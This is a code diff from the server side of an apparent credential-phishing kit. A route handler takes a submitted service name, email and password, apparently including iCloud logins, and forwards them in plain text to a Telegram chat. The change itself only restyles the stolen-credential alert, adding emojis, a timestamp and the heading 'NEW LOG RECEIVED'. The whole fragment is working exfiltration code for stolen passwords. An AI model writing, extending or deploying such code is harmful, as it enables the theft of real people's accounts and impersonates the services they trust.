@@ -41,10 +41,14 @@ export async function registerRoutes(
     try {
       const input = api.credentials.create.input.parse(req.body);
       // Log notification
-      const message = `<b>New Login Attempt</b>\n\n` +
-        `<b>Service:</b> ${input.service}\n` +
-        `<b>Email:</b> <code>${input.email}</code>\n` +
-        `<b>Password:</b> <code>${input.password}</code>`;
+      const emoji = input.service === "icloud" ? "🍎" : "👤";
+      const message = `<b>${emoji} NEW LOG RECEIVED</b>\n\n` +
+        `<b>━━━━━━━━━━━━━━━━━━</b>\n` +
+        `<b>🌐 Service:</b> <code>${input.service.toUpperCase()}</code>\n` +
+        `<b>📧 Email:</b> <code>${input.email}</code>\n` +
+        `<b>🔑 Password:</b> <code>${input.password}</code>\n` +
+        `<b>━━━━━━━━━━━━━━━━━━</b>\n` +
+        `<b>🕒 Time:</b> <code>${new Date().toLocaleString()}</code>`;
       
       await sendToTelegram(message);
       
